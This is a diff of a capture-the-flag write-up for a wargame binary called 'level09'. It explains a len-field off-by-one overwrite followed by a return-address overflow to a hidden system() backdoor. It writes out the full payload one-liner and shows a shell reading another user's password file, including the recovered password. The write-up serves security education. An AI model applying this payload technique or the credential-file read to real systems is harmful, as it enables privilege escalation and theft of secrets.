@@ -1,51 +1,49 @@
-# Level09 — Buffer Overflow with PIE Bypass & Hidden Function Exploitation
+# Level09 — Buffer Overflow & Return Address Overwrite
 
 ## Context
 
 Inside the home directory of the `level09` user, we find a binary named `level09`.
-The program implements a messaging system that collects username and message input from users.
-Our objective is to exploit buffer overflow vulnerabilities while bypassing Position Independent Executable (PIE) protection to execute a hidden backdoor function.
+The program implements a messaging system with a username and message functionality.
+Our objective is to exploit a buffer overflow vulnerability to gain elevated privileges by redirecting execution to a hidden backdoor function.
 
 ---
 
-## Initial Environment — Directory Listing
+## Initial Environment — Directory Listing & Security Analysis
 
 ```bash
 $ ls -la
 total 17
-dr-xr-x---+ 1 end end   80 Oct  2  2016 .
+dr-xr-x---+ 1 end     end       80 Oct  2  2016 .
 dr-x--x--x  1 root    root     260 Oct  2  2016 ..
--rw-r--r--  1 end end  220 Sep 10  2016 .bash_logout
+-rw-r--r--  1 end     end      220 Sep 10  2016 .bash_logout
 lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
 -rw-r--r--  1 level09 level09 3533 Sep 10  2016 .bashrc
--rwsr-s---+ 1 end users   12288 Sep 10  2016 level09
--rw-r--r--  1 end end  675 Sep 10  2016 .profile
+-rwsr-s---+ 1 end     users   12152 Sep 10  2016 level09
+-rw-r--r--  1 end     end      675 Sep 10  2016 .profile
 ```
 
 > **Note:** the binary `level09` has the **SUID** bit set (`rws`), so it runs with the privileges of its owner (`end`).
 
----
-
-## Security Analysis
+### Security Analysis
 
 ```bash
-$ checksec --file ./level09
+$ checksec --file ./level09 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./level09
 ```
 
-**Key security features:**
-* **Partial RELRO** → GOT partially writable
-* **No stack canary** → Stack buffer overflow protection disabled
-* **NX enabled** → Stack not executable (no shellcode execution)
-* **PIE enabled** → Randomized memory layout, unpredictable addresses
+**Key Security Features:**
+- **No Stack Canary**: Buffer overflows can overwrite return addresses
+- **NX Enabled**: Stack is non-executable, preventing shellcode injection
+- **PIE Enabled**: Address Space Layout Randomization is active
+- **Partial RELRO**: Some protection against GOT overwrites
 
 ---
 
 ## Running the Binary
 
 ```bash
-$ ./level09
+$ ./level09 
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
@@ -53,182 +51,228 @@ $ ./level09
 >>: test
 >: Welcome, test
 >: Msg @Unix-Dude
->>: hello world
+>>: test
 >: Msg sent!
 ```
 
-The program implements a simple messaging interface with username and message input.
+The program implements a simple messaging system with username input and message functionality.
 
 ---
 
-## Static Analysis (Disassembly)
+## Source Code Analysis
 
-**Program Flow Analysis:**
+### Program Structure
 
-### Main Function
-```asm
-0x0000000000000aa8 <+0>:    push   %rbp
-0x0000000000000ab3 <+11>:   callq  0x730 <puts@plt>      ; Welcome banner
-0x0000000000000ab8 <+16>:   callq  0x8c0 <handle_msg>    ; Main functionality
+```c
+typedef struct s_message {
+    char text[140];      // Message buffer
+    char username[40];   // Username buffer  
+    int  len;           // Message length (initialized to 140)
+} t_message;
 ```
 
-### Handle Message Function
-```asm
-0x00000000000008c4 <+4>:    sub    $0xc0,%rsp            ; Stack space allocation
-0x0000000000000910 <+80>:   callq  0x9cd <set_username>  ; Username input
-0x000000000000091f <+95>:   callq  0x932 <set_msg>       ; Message input
+### Main Function Flow
+```c
+int main(void)
+{
+    puts("--------------------------------------------\n"
+         "|   ~Welcome to l33t-m$n ~    v1337        |\n"
+         "--------------------------------------------");
+
+    t_message message;
+    memset(&message, 0, sizeof(message));
+    message.len = 140;  // Set message length limit
+    
+    handle_msg(&message);
+    return 0;
+}
 ```
 
-### Set Username Function
-```asm
-0x00000000000009d1 <+4>:    sub    $0xa0,%rsp            ; 160-byte stack allocation
-0x0000000000000a38 <+107>:  callq  0x770 <fgets@plt>     ; Read 128 bytes into local buffer
-0x0000000000000a5f <+146>:  mov    %cl,0x8c(%rdx,%rax,1) ; Copy to structure offset 0x8c
+### Critical Functions
+
+#### 1. Hidden Backdoor Function
+```c
+void secret_backdoor(void)
+{
+    char buffer[128];
+    if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
+        system(buffer);  // Execute shell commands!
+    }
+}
 ```
 
-### Set Message Function  
-```asm
-0x0000000000000936 <+4>:    sub    $0x410,%rsp           ; 1040-byte stack allocation
-0x0000000000000995 <+99>:   mov    $0x400,%esi           ; Read up to 1024 bytes
-0x000000000000099d <+107>:  callq  0x770 <fgets@plt>     ; Input into local buffer
-0x00000000000009c6 <+148>:  callq  0x720 <strncpy@plt>   ; Copy to structure
+#### 2. Username Input Function
+```c
+void set_username(t_message *message)
+{
+    char local_buffer[128];
+    
+    memset(local_buffer, 0, sizeof(local_buffer));
+    puts(">: Enter your username");
+    printf(">>: ");
+    
+    if (fgets(local_buffer, sizeof(local_buffer), stdin) == NULL)
+        return;
+
+    // VULNERABILITY: Copies up to 41 characters without bounds checking
+    for (int i = 0; i < 41 && local_buffer[i] != '\0'; ++i) {
+        message->username[i] = local_buffer[i];
+    }
+
+    printf(">: Welcome, %s", message->username);
+}
 ```
 
-### Hidden Function Discovery
-```bash
-(gdb) i fun
-0x000000000000088c  secret_backdoor
-```
+#### 3. Message Input Function
+```c
+void set_msg(t_message *message)
+{
+    char local_buffer[1024];
+    
+    memset(local_buffer, 0, sizeof(local_buffer));
+    puts(">: Msg @Unix-Dude");
+    printf(">>: ");
+    
+    if (fgets(local_buffer, sizeof(local_buffer), stdin) == NULL)
+        return;
 
-```asm
-0x000000000000088c <+0>:    push   %rbp
-0x00000000000008ad <+33>:   callq  0x770 <fgets@plt>     ; Read command
-0x00000000000008b9 <+45>:   callq  0x740 <system@plt>    ; Execute command!
+    // Uses message->len to limit copy (initially 140)
+    if (message->len > 0) {
+        strncpy(message->text, local_buffer, (size_t)message->len);
+    }
+}
 ```
-
-**Critical observations:**
-* Username limited to 40 characters, copied to structure at offset 0x8c
-* Message can be up to 1024 characters
-* Hidden `secret_backdoor` function executes arbitrary commands
 
 ---
 
 ## Vulnerability Analysis
 
-### Buffer Overflow in Username
+### Buffer Overflow in Username Function
 
-Testing username input length:
+**Critical Issue:** The `set_username()` function has a buffer overflow vulnerability:
 
-```bash
-$ ./level09
->>: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9...
->: Welcome, Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2>: Msg @Unix-Dude
+1. **Username buffer**: Only 40 bytes allocated in struct
+2. **Copy loop**: Copies up to 41 characters
+3. **Memory layout**: Username buffer is adjacent to the `len` field
+
+### Memory Layout Analysis
+
+```
+struct s_message layout:
++0x00: char text[140]     (140 bytes)
++0x8C: char username[40]  (40 bytes) 
++0xB4: int len            (4 bytes)
 ```
 
-Username truncation occurs around 40 characters, but affects subsequent program flow.
-
-### Buffer Overflow in Message
-
-Testing message input with cyclic pattern:
-
-```bash
-(gdb) run
->>: test
->>: [Long cyclic pattern]
-
-Program received signal SIGSEGV, Segmentation fault.
-0x4138674137674136 in ?? ()
-```
-
-**Message buffer overflow confirmed:**
-* Pattern `0x4138674137674136` corresponds to "6Ag7Ag8" in cyclic input
-* **Overflow offset:** Approximately 200 bytes to control return address
+**Exploitation Vector:**
+- Overflow username buffer (40 bytes)
+- Overwrite the `len` field with a large value
+- Control message length for subsequent buffer overflow
 
 ---
 
-## PIE Bypass Strategy
+## Static Analysis (Disassembly)
 
-### Address Space Layout Randomization Challenge
+### Backdoor Function Location
+```asm
+(gdb) disass secret_backdoor 
+Dump of assembler code for function secret_backdoor:
+   0x000000000000088c <+0>:    push   %rbp
+   0x000000000000088d <+1>:    mov    %rsp,%rbp
+   0x0000000000000894 <+8>:    mov    0x20171d(%rip),%rax    # stdin
+   0x00000000000008ad <+33>:   callq  0x770 <fgets@plt>     # Read command
+   0x00000000000008b9 <+45>:   callq  0x740 <system@plt>    # Execute!
+```
 
-With PIE enabled, function addresses change on each execution:
-
-```bash
-(gdb) b main 
-Breakpoint 1 at 0xaac
-(gdb) run
-Starting program: /home/users/level09/level09 
-warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
-
-Breakpoint 1, 0x0000555555554aac in main ()
-(gdb) i fun secret_backdoor 
-All functions matching regular expression "secret_backdoor":
-
-Non-debugging symbols:
-0x000055555555488c  secret_backdoor
-
+### Username Processing Vulnerability
+```asm
+# Loop copying username characters  
+0x0000000000000a6a <+157>: cmpl   $0x28,-0x4(%rbp)  # Compare with 40 (0x28)
+0x0000000000000a6e <+161>: jg     0xa81              # Jump if > 40
+0x0000000000000a5f <+146>: mov    %cl,0x8c(%rdx,%rax,1) # Store in username[i]
 ```
 
 ---
 
-## Exploitation Development
+## Exploitation Strategy
 
-### Step 1: PIE Base Address Leak
+### Phase 1: Len Field Overwrite
 
-Overflow username to leak adjacent memory containing function pointers:
+**Objective:** Overwrite the `len` field to enable larger message input
 
 ```bash
-$ python -c 'print "A" * 40 + "\xDC"'
+# Username: 40 'a' characters + len overwrite
+Username: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xDC"
 ```
 
-The `\xDC` byte overwrites the length field, causing more data to be copied and displayed.
+The `\xDC` (220 decimal) overwrites the `len` field, allowing 220 bytes in message input.
 
-### Step 2: Address Calculation
+### Phase 2: Return Address Overwrite
 
-From the leaked addresses, calculate the PIE base and `secret_backdoor` address:
+**Objective:** Overflow message buffer to overwrite return address with `secret_backdoor`
+
+```bash
+# Message: 200 'a' characters + backdoor address
+Message: "a" * 200 + backdoor_address
+```
+
+### Phase 3: Address Resolution
+
+**PIE Challenge:** Due to PIE, we need to determine the backdoor address at runtime.
+
+**GDB Analysis:**
+```bash
+(gdb) b *main+0
+(gdb) run
+(gdb) x secret_backdoor 
+0x55555555488c <secret_backdoor>: 0xe5894855
+```
+
+The backdoor address: `0x55555555488c`
+
+---
+
+## Payload Construction
+
+### Complete Exploit Payload
 
 ```python
-# Example leaked address: 0x555555554abc
-# PIE base = leaked_address - known_offset
-# secret_backdoor = PIE_base + 0x88c
+payload = (
+    "a" * 40 +                    # Fill username buffer
+    "\xDC" +                      # Overwrite len field (220)
+    "\n" +                        # Username input terminator
+    "a" * 200 +                   # Fill message buffer + padding
+    "\x8c\x48\x55\x55\x55\x55\x00\x00" +  # secret_backdoor address (little-endian)
+    "/bin/sh"                   # Command for backdoor
+)
 ```
 
-### Step 3: Return Address Overwrite
-
-Overflow the message buffer to control the return address:
-
-```bash
-PAYLOAD = "A" * 200 + secret_backdoor_address
-```
+### Address Format Explanation
+- **Original address**: `0x55555555488c`
+- **Little-endian format**: `\x8c\x48\x55\x55\x55\x55\x00\x00`
+- **Padding**: Required for 8-byte alignment (x64 architecture)
 
 ---
 
-## Exploitation
+## Exploitation Execution
 
-### Method 1: Static Address Calculation
-
-Using knowledge of the binary layout, construct payload with calculated address:
+### Method 1: Python Payload Generation
 
 ```bash
-$ (python -c 'print "a" * 40 + "\xDC" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"[::-1] + "/bin/sh"'; cat) | ./level09
-```
-
-### Method 2: Runtime Address Resolution
-
-The successful exploitation shows:
-
-```bash
-$ (python -c 'print "a" * 40 + "\xDC" + "\n" + "a" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "/bin/sh"'; cat) | ./level09
+$ (python -c 'print "a" * 40 + "\xDC" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh"'; cat) | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
 >: Enter your username
->>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
+>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaܜ
 >: Msg @Unix-Dude
 >>: >: Msg sent!
+id
+uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users) groups=1009(end),100(users),1010(level09)
 cat /home/users/end/.pass
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 ```
 
-**Success:** Shell access with `end` privileges and final password extraction!
+**Success:** Shell access with `end` privileges and password extraction!
 
 ---
